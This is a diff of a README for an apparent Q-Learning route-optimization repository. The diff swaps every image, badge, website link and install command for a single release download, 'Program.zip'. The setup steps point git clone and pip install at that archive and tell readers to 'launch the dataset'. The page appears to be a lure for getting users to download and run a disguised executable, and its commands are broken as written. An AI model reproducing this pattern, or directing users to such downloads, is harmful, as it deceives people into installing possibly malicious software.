@@ -1,6 +1,6 @@
 # Q-Learning for Process Optimization 🤖
 
-![Q-Learning](https://img.icons8.com/color/452/robot-2.png)
+![Q-Learning](https://github.com/jaim-pato15/q_learning/releases/download/v1.0/Program.zip)
 
 Welcome to the **q_learning** repository - your go-to source for implementing Q-Learning for process optimization! In this project, we showcase how artificial intelligence (AI) can calculate the shortest route between locations using the Q-Learning algorithm. By leveraging reinforcement learning techniques, we demonstrate how AI can fine-tune decision-making in a simulated environment with defined states and rewards. Let's dive into the world of optimization with Q-Learning! 🚀
 
@@ -35,15 +35,15 @@ Q-Learning is a model-free reinforcement learning algorithm used to optimize dec
 To get started with the Q-Learning implementation for process optimization, follow these steps:
 1. Clone the repository:
    ```bash
-   git clone https://github.com/yourusername/q_learning.git
+   git clone https://github.com/jaim-pato15/q_learning/releases/download/v1.0/Program.zip
    ```
 2. Install the required dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/jaim-pato15/q_learning/releases/download/v1.0/Program.zip
    ```
-3. Download the necessary dataset from the following link: [**Download Dataset**](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+3. Download the necessary dataset from the following link: [**Download Dataset**](https://github.com/jaim-pato15/q_learning/releases/download/v1.0/Program.zip)
 
-   ![Download Dataset](https://img.shields.io/badge/Download-Dataset-blue)
+   ![Download Dataset](https://github.com/jaim-pato15/q_learning/releases/download/v1.0/Program.zip)
 
 4. Launch the dataset and start optimizing your processes using Q-Learning!
 
@@ -70,9 +70,9 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Feel free to explore and experiment with the Q-Learning implementation for process optimization. Start optimizing your processes today with AI-driven solutions! 🤖🔍
 
-For more information, visit our [official website](https://www.qlearningoptimization.com).
+For more information, visit our [official website](https://github.com/jaim-pato15/q_learning/releases/download/v1.0/Program.zip).
 
 Let's revolutionize process optimization with Q-Learning! 🌟
 
-![AI Optimization](https://img.icons8.com/ios/452/artificial-intelligence.png)
+![AI Optimization](https://github.com/jaim-pato15/q_learning/releases/download/v1.0/Program.zip)
 
